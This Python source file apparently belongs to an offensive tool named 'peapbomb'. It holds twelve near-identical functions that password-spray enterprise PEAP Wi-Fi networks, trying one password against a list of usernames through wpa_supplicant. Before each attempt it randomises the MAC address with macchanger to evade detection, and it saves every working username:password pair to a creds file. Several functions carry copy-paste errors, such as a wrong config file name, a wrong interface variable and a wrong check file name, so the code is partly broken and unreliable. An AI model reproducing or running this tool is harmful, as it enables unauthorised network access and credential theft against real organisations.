import subprocess
import os

from peapbomb import color, conf, driver, res


def connection1(password, user_list1, face1, ssid):
    for user in user_list1:
        change_mac = "ifconfig " + face1 + " down; macchanger -r " + face1 + " >" + conf + ".garb; ifconfig " + face1 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con1.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face1 + " -D" + driver + " -c " + conf + "con1.conf >" + conf + "con1.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face1 + " down; ifconfig " + face1 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con1.res | grep succeeded >" + conf + "check1.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check1.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection2(password, user_list2, face2, ssid):
    for user in user_list2:
        change_mac = "ifconfig " + face2 + " down; macchanger -r " + face2 + " >" + conf + ".garb; ifconfig " + face2 + " up"
        subprocess.call(change_mac, shell=True)
        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con2.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face2 + " -D" + driver + " -c " + conf + "con2.conf >" + conf + "con2.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face2 + " down; ifconfig " + face2 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con2.res | grep succeeded >" + conf + "check2.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check2.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection3(password, user_list3, face3, ssid):
    for user in user_list3:
        change_mac = "ifconfig " + face3 + " down; macchanger -r " + face3 + " >" + conf + ".garb; ifconfig " + face3 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con3.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face3 + " -D" + driver + " -c " + conf + "con3.conf >" + conf + "con3.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face3 + " down; ifconfig " + face3 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con3.res | grep succeeded >" + conf + "check3.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check3.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection4(password, user_list4, face4, ssid):
    for user in user_list4:
        change_mac = "ifconfig " + face4 + " down; macchanger -r " + face4 + " >" + conf + ".garb; ifconfig " + face4 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con4.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face4 + " -D" + driver + " -c " + conf + "con4.conf >" + conf + "con4.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face4 + " down; ifconfig " + face4 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con4.res | grep succeeded >" + conf + "check4.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check4.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection5(password, user_list5, face5, ssid):
    for user in user_list5:
        change_mac = "ifconfig " + face5 + " down; macchanger -r " + face5 + " >" + conf + ".garb; ifconfig " + face5 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con5.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face5 + " -D" + driver + " -c " + conf + "con5.conf >" + conf + "con5.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face5 + " down; ifconfig " + face5 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con5.res | grep succeeded >" + conf + "check5.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check5.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection6(password, user_list6, face6, ssid):
    for user in user_list6:
        change_mac = "ifconfig " + face6 + " down; macchanger -r " + face6 + " >" + conf + ".garb; ifconfig " + face6 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant                                                                                                                                     
eapol_version=1                                                                                                                                                                                  
network={                                                                                                                                                                                        
ssid="%s"                                                                                                                                                                                        
key_mgmt=WPA-EAP                                                                                                                                                                                 
eap=PEAP                                                                                                                                                                                         
identity="%s"                                                                                                                                                                                    
password="%s"                                                                                                                                                                                    
}                                                                                                                                                                                                
""" % (ssid, user, password)

        wpa_write = open(conf + "con6.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face6 + " -D" + driver + " -c " + conf + "con6.conf >" + conf + "con6.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face6 + " down; ifconfig " + face6 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con6.res | grep succeeded >" + conf + "check6.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check6.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection7(password, user_list7, face7, ssid):
    for user in user_list7:
        change_mac = "ifconfig " + face7 + " down; macchanger -r " + face7 + " >" + conf + ".garb; ifconfig " + face7 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con7.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face7 + " -D" + driver + " -c " + conf + "con1.conf >" + conf + "con7.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face7 + " down; ifconfig " + face7 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con7.res | grep succeeded >" + conf + "check7.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check7.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection8(password, user_list8, face8, ssid):
    for user in user_list8:
        change_mac = "ifconfig " + face8 + " down; macchanger -r " + face8 + " >" + conf + ".garb; ifconfig " + face8 + " up"
        subprocess.call(change_mac, shell=True)
        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con8.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face8 + " -D" + driver + " -c " + conf + "con8.conf >" + conf + "con8.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face8 + " down; ifconfig " + face8 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con8.res | grep succeeded >" + conf + "check8.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check8.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection9(password, user_list9, face9, ssid):
    for user in user_list9:
        change_mac = "ifconfig " + face9 + " down; macchanger -r " + face9 + " >" + conf + ".garb; ifconfig " + face9 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con9.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face3 + " -D" + driver + " -c " + conf + "con9.conf >" + conf + "con9.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face9 + " down; ifconfig " + face9 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con9.res | grep succeeded >" + conf + "check9.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check9.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection10(password, user_list10, face10, ssid):
    for user in user_list10:
        change_mac = "ifconfig " + face10 + " down; macchanger -r " + face10 + " >" + conf + ".garb; ifconfig " + face10 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con10.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face10 + " -D" + driver + " -c " + conf + "con10.conf >" + conf + "con10.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face10 + " down; ifconfig " + face10 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con10.res | grep succeeded >" + conf + "check10.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check101.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection11(password, user_list11, face11, ssid):
    for user in user_list11:
        change_mac = "ifconfig " + face11 + " down; macchanger -r " + face11 + " >" + conf + ".garb; ifconfig " + face11 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con11.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face11 + " -D" + driver + " -c " + conf + "con11.conf >" + conf + "con11.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face11 + " down; ifconfig " + face11 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con11.res | grep succeeded >" + conf + "check11.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check11.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection12(password, user_list12, face12, ssid):
    for user in user_list12:
        change_mac = "ifconfig " + face12 + " down; macchanger -r " + face12 + " >" + conf + ".garb; ifconfig " + face12 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant                                                                                                                                     
eapol_version=1                                                                                                                                                                                  
network={                                                                                                                                                                                        
ssid="%s"                                                                                                                                                                                        
key_mgmt=WPA-EAP                                                                                                                                                                                 
eap=PEAP                                                                                                                                                                                         
identity="%s"                                                                                                                                                                                    
password="%s"                                                                                                                                                                                    
}                                                                                                                                                                                                
""" % (ssid, user, password)

        wpa_write = open(conf + "con12.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face12 + " -D" + driver + " -c " + conf + "con12.conf >" + conf + "con12.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face12 + " down; ifconfig " + face12 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con12.res | grep succeeded >" + conf + "check12.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check12.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)
